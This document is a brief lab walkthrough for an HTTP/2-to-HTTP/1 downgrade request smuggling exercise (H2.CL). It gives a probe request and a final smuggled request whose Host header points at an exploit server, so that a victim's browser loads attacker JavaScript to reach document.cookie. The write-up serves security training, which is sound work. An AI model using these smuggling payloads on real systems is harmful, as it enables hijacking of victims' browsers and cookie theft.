Title: H2.CL request smuggling
Level: PRACTITIONER
Desc:  This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.
To solve the lab, perform a request smuggling attack that causes the victim's browser to load and execute a malicious JavaScript file from the exploit server, calling alert(document.cookie). The victim user accesses the home page every 10 seconds. 

# Walkthroug:
First request to try:
```
POST / HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Length: 0

SMUGGLED
```
Every second request should give 404, but it was not working in my case.

Final request to send:
```
POST / HTTP/2
Host: 0a0500f1030a2f91814608c600510093.web-security-academy.net
Content-Length: 0

GET /resources HTTP/1.1
Host: exploit-0a6f00f603992f588173073601b2003d.exploit-server.net
Content-Length: 5

x=1
```
Accessing /resources you get redirection to HOST+PATH, so sending upper request will cause browser to ask for: https://exploit-0a6f00f603992f588173073601b2003d.exploit-server.net/resources


